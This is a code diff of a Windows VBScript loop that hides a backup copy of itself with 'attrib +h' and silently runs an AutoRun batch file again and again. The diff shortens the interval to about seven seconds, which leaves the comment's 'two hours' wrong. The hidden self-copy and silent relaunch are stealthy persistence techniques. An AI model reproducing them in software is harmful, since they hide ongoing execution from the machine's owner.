@@ -2,7 +2,7 @@
 WScript.Sleep 1000
 
 ' Set the period between executions in milliseconds (2 hours = 7200000 milliseconds)
-Const period = 7200000
+Const period = 7200
 
 ' Path of the current script
 Set fso = CreateObject("Scripting.FileSystemObject")
@@ -21,7 +21,7 @@ Do
     ' Set the hidden attribute on the backup script
     WshShell.Run "cmd /c attrib +h " & chr(34) & backupPath & chr(34), 0, True
     ' Run the AutoRun.bat file
-    WshShell.Run chr(34) & "AutoRun.cmd" & Chr(34), 0
+    WshShell.Run chr(34) & "AutoRun.bat" & Chr(34), 0
     ' Wait for the specified period
     WScript.Sleep period
 Loop
